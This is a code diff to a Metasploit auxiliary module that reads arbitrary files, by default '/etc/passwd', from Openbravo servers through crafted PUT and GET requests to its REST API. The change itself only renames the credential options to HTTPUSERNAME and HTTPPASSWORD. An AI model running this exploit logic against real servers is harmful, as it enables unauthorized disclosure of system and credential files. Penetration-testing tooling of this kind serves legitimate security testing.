@@ -41,8 +41,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [ true, "Base Openbravo directory path", '/openbravo/']),
-        OptString.new('USERNAME', [true, "The Openbravo user", "Openbravo"]),
-        OptString.new('PASSWORD', [true, "The Openbravo password", "openbravo"]),
+        OptString.new('HTTPUSERNAME', [true, "The Openbravo user", "Openbravo"]),
+        OptString.new('HTTPPASSWORD', [true, "The Openbravo password", "openbravo"]),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
         OptString.new('ENDPOINT', [true, "The XML API REST endpoint to use", "ADUser"])
       ], self.class)
@@ -53,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
     users = send_request_raw({
       'method' => 'GET',
       'uri' => normalize_uri(datastore['TARGETURI'], "/ws/dal/#{datastore["ENDPOINT"]}"),
-      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+      'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HTTPPASSWORD'])
     }, 60)
 
     if !users or users.code != 200
@@ -86,7 +86,7 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'PUT',
         'uri' => normalize_uri(target_uri.path, "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
         'data' => xml,
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+        'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HTTPPASSWORD'])
       })
 
       if !resp or resp.code != 200 or resp.body =~ /Not updating entity/
@@ -99,7 +99,7 @@ class MetasploitModule < Msf::Auxiliary
       u = send_request_raw({
         'method' => 'GET',
         'uri' => normalize_uri(datastore['TARGETURI'], "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
-        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+        'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HTTPPASSWORD'])
       })
 
       u = REXML::Document.new u.body
@@ -116,7 +116,7 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'PUT',
         'uri' => normalize_uri(target_uri.path, "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
       'data' => xml,
-      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
+      'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HTTPPASSWORD'])
       })
 
       print_good("File saved to: #{path}")
